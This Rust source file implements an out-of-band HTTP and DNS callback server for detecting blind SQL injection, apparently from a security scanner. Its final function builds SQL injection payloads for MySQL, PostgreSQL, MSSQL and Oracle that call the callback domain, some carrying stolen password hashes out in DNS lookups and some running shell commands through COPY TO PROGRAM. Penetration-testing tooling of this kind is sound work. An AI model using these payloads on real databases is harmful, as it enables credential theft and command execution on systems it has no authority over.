//! OOB Server - Out-of-Band Interaction Server
//! Handles DNS and HTTP callbacks for blind SQLi detection
#![allow(dead_code, unused_imports, unused_variables, unused_mut, clippy::too_many_arguments, clippy::borrowed_box)]

use anyhow::{anyhow, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::{mpsc, RwLock};
use tracing::{debug, info, warn};
use uuid::Uuid;

/// OOB Server configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OobServerConfig {
    pub http_port: u16,
    pub dns_port: u16,
    pub domain: String,
    pub public_host: String, // Public IP/domain for callbacks
    pub ttl_seconds: u64,
}

impl Default for OobServerConfig {
    fn default() -> Self {
        Self {
            http_port: 8080,
            dns_port: 53,
            domain: "intelexia.local".to_string(),
            public_host: "127.0.0.1".to_string(),
            ttl_seconds: 3600, // 1 hour
        }
    }
}

/// Type of OOB interaction
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum InteractionType {
    Dns,
    Http,
    Https,
    Smtp,
}

impl std::fmt::Display for InteractionType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            InteractionType::Dns => write!(f, "DNS"),
            InteractionType::Http => write!(f, "HTTP"),
            InteractionType::Https => write!(f, "HTTPS"),
            InteractionType::Smtp => write!(f, "SMTP"),
        }
    }
}

/// A single OOB interaction
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OobInteraction {
    pub id: String,
    pub interaction_id: String, // The unique ID (e.g., "abc123.intelexia.local")
    pub interaction_type: InteractionType,
    pub source_ip: String,
    pub source_port: u16,
    pub data: Option<String>,
    pub raw_request: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    pub path: Option<String>,
    pub query: Option<String>,
    pub timestamp: DateTime<Utc>,
}

/// OOB Server status
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OobServerStatus {
    pub running: bool,
    pub http_address: Option<String>,
    pub dns_address: Option<String>,
    pub interactions_count: u64,
    pub active_ids: Vec<String>,
}

/// OOB ID with metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OobId {
    pub id: String,
    pub full_domain: String,
    pub created_at: DateTime<Utc>,
    pub expires_at: DateTime<Utc>,
    pub description: Option<String>,
}

/// OOB Server controller
pub struct OobServer {
    config: OobServerConfig,
    interactions: Arc<RwLock<Vec<OobInteraction>>>,
    active_ids: Arc<RwLock<HashMap<String, OobId>>>,
    http_handle: Arc<RwLock<Option<tokio::task::JoinHandle<()>>>>,
    dns_handle: Arc<RwLock<Option<tokio::task::JoinHandle<()>>>>,
    shutdown_tx: Arc<RwLock<Option<mpsc::Sender<()>>>>,
}

impl OobServer {
    /// Create a new OOB server instance
    pub fn new(config: OobServerConfig) -> Self {
        Self {
            config,
            interactions: Arc::new(RwLock::new(Vec::new())),
            active_ids: Arc::new(RwLock::new(HashMap::new())),
            http_handle: Arc::new(RwLock::new(None)),
            dns_handle: Arc::new(RwLock::new(None)),
            shutdown_tx: Arc::new(RwLock::new(None)),
        }
    }

    /// Start the OOB server (HTTP + DNS)
    pub async fn start(&self) -> Result<()> {
        if self.is_running().await {
            return Err(anyhow!("OOB server is already running"));
        }

        info!("Starting OOB server on domain: {}", self.config.domain);

        // Create shutdown channel
        let (shutdown_tx, shutdown_rx) = mpsc::channel::<()>(1);
        *self.shutdown_tx.write().await = Some(shutdown_tx);

        // Start HTTP server
        let http_interactions = self.interactions.clone();
        let http_ids = self.active_ids.clone();
        let http_port = self.config.http_port;
        let http_domain = self.config.domain.clone();
        
        let http_handle = tokio::spawn(async move {
            if let Err(e) = run_http_server(http_port, http_domain, http_interactions, http_ids, shutdown_rx).await {
                warn!("HTTP server error: {}", e);
            }
        });
        *self.http_handle.write().await = Some(http_handle);

        // Start DNS server
        let dns_interactions = self.interactions.clone();
        let dns_ids = self.active_ids.clone();
        let dns_port = self.config.dns_port;
        let dns_domain = self.config.domain.clone();
        let (_dns_shutdown_tx, dns_shutdown_rx) = mpsc::channel::<()>(1);
        
        let dns_handle = tokio::spawn(async move {
            if let Err(e) = run_dns_server(dns_port, dns_domain, dns_interactions, dns_ids, dns_shutdown_rx).await {
                warn!("DNS server error: {}", e);
            }
        });
        *self.dns_handle.write().await = Some(dns_handle);

        info!("OOB server started - HTTP port: {}, DNS port: {}", 
              self.config.http_port, self.config.dns_port);
        
        Ok(())
    }

    /// Stop the OOB server
    pub async fn stop(&self) -> Result<()> {
        info!("Stopping OOB server...");

        // Send shutdown signal
        if let Some(tx) = self.shutdown_tx.write().await.take() {
            let _ = tx.send(()).await;
        }

        // Abort HTTP server
        if let Some(handle) = self.http_handle.write().await.take() {
            handle.abort();
        }

        // Abort DNS server
        if let Some(handle) = self.dns_handle.write().await.take() {
            handle.abort();
        }

        info!("OOB server stopped");
        Ok(())
    }

    /// Check if server is running
    pub async fn is_running(&self) -> bool {
        self.http_handle.read().await.is_some()
    }

    /// Get server status
    pub async fn get_status(&self) -> OobServerStatus {
        let running = self.is_running().await;
        let interactions = self.interactions.read().await;
        let active_ids = self.active_ids.read().await;
        
        OobServerStatus {
            running,
            http_address: if running {
                Some(format!("http://{}:{}", self.config.public_host, self.config.http_port))
            } else {
                None
            },
            dns_address: if running {
                Some(format!("{}:{}", self.config.public_host, self.config.dns_port))
            } else {
                None
            },
            interactions_count: interactions.len() as u64,
            active_ids: active_ids.keys().cloned().collect(),
        }
    }

    /// Generate a new unique OOB ID
    pub async fn generate_id(&self, description: Option<String>) -> OobId {
        let id = Uuid::new_v4().to_string()[..8].to_string();
        let full_domain = format!("{}.{}", id, self.config.domain);
        let now = Utc::now();
        let expires = now + chrono::Duration::seconds(self.config.ttl_seconds as i64);
        
        let oob_id = OobId {
            id: id.clone(),
            full_domain,
            created_at: now,
            expires_at: expires,
            description,
        };
        
        self.active_ids.write().await.insert(id, oob_id.clone());
        oob_id
    }

    /// Get all interactions (optionally filtered by interaction_id)
    pub async fn get_interactions(&self, interaction_id: Option<&str>) -> Vec<OobInteraction> {
        let interactions = self.interactions.read().await;
        
        if let Some(id) = interaction_id {
            interactions
                .iter()
                .filter(|i| i.interaction_id.starts_with(id))
                .cloned()
                .collect()
        } else {
            interactions.clone()
        }
    }

    /// Get interactions for a specific OOB ID
    pub async fn get_interactions_for_id(&self, id: &str) -> Vec<OobInteraction> {
        let prefix = format!("{}.{}", id, self.config.domain);
        let interactions = self.interactions.read().await;
        
        interactions
            .iter()
            .filter(|i| i.interaction_id == prefix)
            .cloned()
            .collect()
    }

    /// Check if an ID has received any interactions
    pub async fn has_interaction(&self, id: &str) -> bool {
        let prefix = format!("{}.{}", id, self.config.domain);
        let interactions = self.interactions.read().await;
        
        interactions.iter().any(|i| i.interaction_id == prefix)
    }

    /// Poll for interactions with timeout
    pub async fn poll_for_interaction(&self, id: &str, timeout_secs: u64) -> Result<Option<Vec<OobInteraction>>> {
        let prefix = format!("{}.{}", id, self.config.domain);
        let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_secs(timeout_secs);
        
        loop {
            {
                let interactions = self.interactions.read().await;
                let matching: Vec<_> = interactions
                    .iter()
                    .filter(|i| i.interaction_id == prefix)
                    .cloned()
                    .collect();
                
                if !matching.is_empty() {
                    return Ok(Some(matching));
                }
            }
            
            if tokio::time::Instant::now() >= deadline {
                return Ok(None);
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }

    /// Cleanup expired IDs and old interactions
    pub async fn cleanup(&self) {
        let now = Utc::now();
        
        // Remove expired IDs
        {
            let mut ids = self.active_ids.write().await;
            ids.retain(|_, v| v.expires_at > now);
        }
        
        // Remove old interactions (keep last 24 hours)
        {
            let mut interactions = self.interactions.write().await;
            let cutoff = now - chrono::Duration::hours(24);
            interactions.retain(|i| i.timestamp > cutoff);
        }
    }

    /// Clear all interactions
    pub async fn clear_interactions(&self) {
        self.interactions.write().await.clear();
    }
}

/// Run HTTP callback server
async fn run_http_server(
    port: u16,
    domain: String,
    interactions: Arc<RwLock<Vec<OobInteraction>>>,
    _active_ids: Arc<RwLock<HashMap<String, OobId>>>,
    mut shutdown_rx: mpsc::Receiver<()>,
) -> Result<()> {
    use axum::{
        extract::{ConnectInfo, Path, Query, Request},
        http::StatusCode,
        routing::get,
        Router,
    };
    use std::collections::HashMap as StdHashMap;
    use tokio::net::TcpListener;

    // Create the router with captured state
    let interactions_capture1 = interactions.clone();
    let domain_capture1 = domain.clone();
    
    let interactions_capture2 = interactions.clone();
    let domain_capture2 = domain.clone();
    
    let app = Router::new()
        .route("/*path", get(
            move |ConnectInfo(addr): ConnectInfo<SocketAddr>,
                  Path(path): Path<String>,
                  Query(query): Query<StdHashMap<String, String>>,
                  request: Request| async move {
                let host = request
                    .headers()
                    .get("host")
                    .and_then(|h| h.to_str().ok())
                    .unwrap_or("unknown")
                    .to_string();
                
                // Extract ID from subdomain
                let interaction_id = if host.ends_with(&domain_capture1) {
                    host.clone()
                } else {
                    "unknown".to_string()
                };

                // Collect headers
                let mut headers = HashMap::new();
                for (name, value) in request.headers() {
                    if let Ok(v) = value.to_str() {
                        headers.insert(name.to_string(), v.to_string());
                    }
                }

                // Build raw request representation
                let raw_request = format!(
                    "{} {} HTTP/1.1\nHost: {}\n\n",
                    request.method(),
                    request.uri(),
                    host
                );

                let interaction = OobInteraction {
                    id: Uuid::new_v4().to_string(),
                    interaction_id,
                    interaction_type: InteractionType::Http,
                    source_ip: addr.ip().to_string(),
                    source_port: addr.port(),
                    data: Some(path.clone()),
                    raw_request: Some(raw_request),
                    headers: Some(headers),
                    path: Some(path),
                    query: Some(serde_json::to_string(&query).unwrap_or_default()),
                    timestamp: Utc::now(),
                };

                // Store interaction
                interactions_capture1.write().await.push(interaction);
                
                debug!("HTTP callback received from {} for {}", addr, host);
                
                // Return a 1x1 transparent pixel GIF
                let pixel = base64::Engine::decode(
                    &base64::engine::general_purpose::STANDARD,
                    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                ).unwrap_or_default();
                
                ([("Content-Type", "image/gif")], pixel)
            }
        ))
        .route("/", get(
            move |ConnectInfo(addr): ConnectInfo<SocketAddr>,
                  request: Request| async move {
                let host = request
                    .headers()
                    .get("host")
                    .and_then(|h| h.to_str().ok())
                    .unwrap_or("unknown")
                    .to_string();
                
                let interaction_id = if host.ends_with(&domain_capture2) {
                    host.clone()
                } else {
                    "unknown".to_string()
                };

                let interaction = OobInteraction {
                    id: Uuid::new_v4().to_string(),
                    interaction_id,
                    interaction_type: InteractionType::Http,
                    source_ip: addr.ip().to_string(),
                    source_port: addr.port(),
                    data: Some("/".to_string()),
                    raw_request: None,
                    headers: None,
                    path: Some("/".to_string()),
                    query: None,
                    timestamp: Utc::now(),
                };

                interactions_capture2.write().await.push(interaction);
                
                // Return 200 OK
                StatusCode::OK
            }
        ));

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    let listener = TcpListener::bind(&addr).await?;
    
    info!("HTTP OOB server listening on {}", addr);

    // Create a shutdown signal that doesn't borrow shutdown_rx
    let shutdown_signal = async move {
        let _ = shutdown_rx.recv().await;
    };

    axum::serve(listener, app)
        .with_graceful_shutdown(shutdown_signal)
        .await?;

    Ok(())
}

/// Run DNS server
async fn run_dns_server(
    port: u16,
    domain: String,
    interactions: Arc<RwLock<Vec<OobInteraction>>>,
    _active_ids: Arc<RwLock<HashMap<String, OobId>>>,
    mut shutdown_rx: mpsc::Receiver<()>,
) -> Result<()> {
    use std::net::UdpSocket;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc as StdArc;

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    let socket = UdpSocket::bind(addr)?;
    socket.set_nonblocking(true)?;
    
    info!("DNS OOB server listening on {}", addr);

    let running = StdArc::new(AtomicBool::new(true));
    let r = running.clone();
    
    // Spawn DNS handler task
    let domain_clone = domain.clone();
    let interactions_clone = interactions.clone();
    
    tokio::spawn(async move {
        let mut buf = [0u8; 512];
        
        while running.load(Ordering::Relaxed) {
            match socket.recv_from(&mut buf) {
                Ok((len, src)) => {
                    // Simple DNS response for any query in our domain
                    if let Ok(query) = parse_dns_query(&buf[..len])
                        && query.ends_with(&domain_clone) {
                            // Log the DNS interaction
                            let query_for_log = query.clone();
                            let interaction = OobInteraction {
                                id: Uuid::new_v4().to_string(),
                                interaction_id: query.clone(),
                                interaction_type: InteractionType::Dns,
                                source_ip: src.ip().to_string(),
                                source_port: src.port(),
                                data: Some(query),
                                raw_request: Some(format!("DNS query from {}", src)),
                                headers: None,
                                path: None,
                                query: None,
                                timestamp: Utc::now(),
                            };
                            
                            interactions_clone.write().await.push(interaction);
                            debug!("DNS query from {} for {}", src, query_for_log);
                            
                            // Send response pointing to ourselves
                            let response = build_dns_response(&buf[..len], &[127, 0, 0, 1]);
                            let _ = socket.send_to(&response, src);
                        }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
                }
                Err(e) => {
                    warn!("DNS socket error: {}", e);
                }
            }
        }
    });

    // Wait for shutdown signal
    let _ = shutdown_rx.recv().await;
    r.store(false, Ordering::Relaxed);

    Ok(())
}

/// Parse a simple DNS query
fn parse_dns_query(data: &[u8]) -> Result<String> {
    if data.len() < 12 {
        return Err(anyhow!("DNS packet too short"));
    }

    // Skip header (12 bytes)
    let mut pos = 12;
    let mut labels = Vec::new();

    // Parse question section
    while pos < data.len() {
        let len = data[pos] as usize;
        if len == 0 {
            break;
        }
        if pos + len + 1 > data.len() {
            return Err(anyhow!("DNS label out of bounds"));
        }
        let label = String::from_utf8_lossy(&data[pos + 1..pos + 1 + len]);
        labels.push(label.to_string());
        pos += len + 1;
    }

    Ok(labels.join("."))
}

/// Build a simple DNS response
fn build_dns_response(query: &[u8], ip: &[u8; 4]) -> Vec<u8> {
    let mut response = Vec::with_capacity(512);

    // Copy header from query
    response.extend_from_slice(&query[..2]); // Transaction ID
    response.extend_from_slice(&[0x81, 0x80]); // Flags: Standard query response
    response.extend_from_slice(&[0x00, 0x01]); // Questions: 1
    response.extend_from_slice(&[0x00, 0x01]); // Answer RRs: 1
    response.extend_from_slice(&[0x00, 0x00]); // Authority RRs: 0
    response.extend_from_slice(&[0x00, 0x00]); // Additional RRs: 0

    // Copy question section
    let mut pos = 12;
    while pos < query.len() && query[pos] != 0 {
        let len = query[pos] as usize;
        response.push(query[pos]);
        response.extend_from_slice(&query[pos + 1..pos + 1 + len]);
        pos += len + 1;
    }
    response.push(0); // End of name
    
    // Copy QTYPE and QCLASS
    if pos + 5 <= query.len() {
        response.extend_from_slice(&query[pos + 1..pos + 5]);
    }

    // Add answer section
    // Name (pointer to question)
    response.extend_from_slice(&[0xc0, 0x0c]);
    // Type: A
    response.extend_from_slice(&[0x00, 0x01]);
    // Class: IN
    response.extend_from_slice(&[0x00, 0x01]);
    // TTL
    response.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]); // 60 seconds
    // RDLENGTH
    response.extend_from_slice(&[0x00, 0x04]);
    // RDATA (IP address)
    response.extend_from_slice(ip);

    response
}

/// Generate SQLi payloads with OOB callbacks
pub fn generate_oob_payloads(oob_domain: &str, dbms: &str) -> Vec<String> {
    let mut payloads = Vec::new();
    
    match dbms.to_lowercase().as_str() {
        "mysql" | "mariadb" => {
            // DNS exfiltration
            payloads.push(format!(
                "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.{}\\\\foo.txt'))",
                oob_domain
            ));
            // Alternative DNS
            payloads.push(format!(
                "(SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{}\\\\boot.ini')))",
                oob_domain
            ));
        }
        "postgresql" | "postgres" => {
            // COPY TO PROGRAM for DNS
            payloads.push(format!(
                "COPY (SELECT '') TO PROGRAM 'nslookup {}'",
                oob_domain
            ));
            // Alternative using host command
            payloads.push(format!(
                "COPY (SELECT version()) TO PROGRAM 'host -t a {}'",
                oob_domain
            ));
        }
        "mssql" | "sqlserver" => {
            // xp_dirtree for DNS
            payloads.push(format!(
                "EXEC master..xp_dirtree '\\\\{}\\\\foo'",
                oob_domain
            ));
            // xp_fileexist
            payloads.push(format!(
                "EXEC master..xp_fileexist '\\\\{}\\\\foo.txt'",
                oob_domain
            ));
            // Alternative using UNC path in query
            payloads.push(format!(
                "SELECT * FROM OPENROWSET(BULK '\\\\{}\\\\foo', SINGLE_CLOB) AS x",
                oob_domain
            ));
        }
        "oracle" => {
            // UTL_HTTP for HTTP callback
            payloads.push(format!(
                "BEGIN UTL_HTTP.REQUEST('http://{}/'); END;",
                oob_domain
            ));
            // HTTPURITYPE
            payloads.push(format!(
                "SELECT HTTPURITYPE('http://{}/').GETCLOB() FROM DUAL",
                oob_domain
            ));
            // DBMS_LDAP for DNS (if available)
            payloads.push(format!(
                "SELECT DBMS_LDAP.INIT((SELECT password FROM users WHERE ROWNUM=1)||'.{}',389) FROM DUAL",
                oob_domain
            ));
        }
        _ => {
            // Generic payloads that might work
            payloads.push(format!(
                "LOAD_FILE('\\\\{}\\\\foo')",
                oob_domain
            ));
        }
    }
    
    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_query_parsing() {
        // Simple test query for example.com
        let query = vec![
            0x00, 0x00, // Transaction ID
            0x01, 0x00, // Flags
            0x00, 0x01, // Questions
            0x00, 0x00, // Answers
            0x00, 0x00, // Authority
            0x00, 0x00, // Additional
            // Query: abc.intelexia.local
            0x03, b'a', b'b', b'c',
            0x09, b'i', b'n', b't', b'e', b'l', b'e', b'x', b'i', b'a',
            0x05, b'l', b'o', b'c', b'a', b'l',
            0x00, // End of name
            0x00, 0x01, // Type A
            0x00, 0x01, // Class IN
        ];
        
        let result = parse_dns_query(&query).unwrap();
        assert_eq!(result, "abc.intelexia.local");
    }

    #[test]
    fn test_oob_payload_generation() {
        let payloads = generate_oob_payloads("abc123.intelexia.local", "mysql");
        assert!(!payloads.is_empty());
        assert!(payloads[0].contains("abc123.intelexia.local"));
    }
}
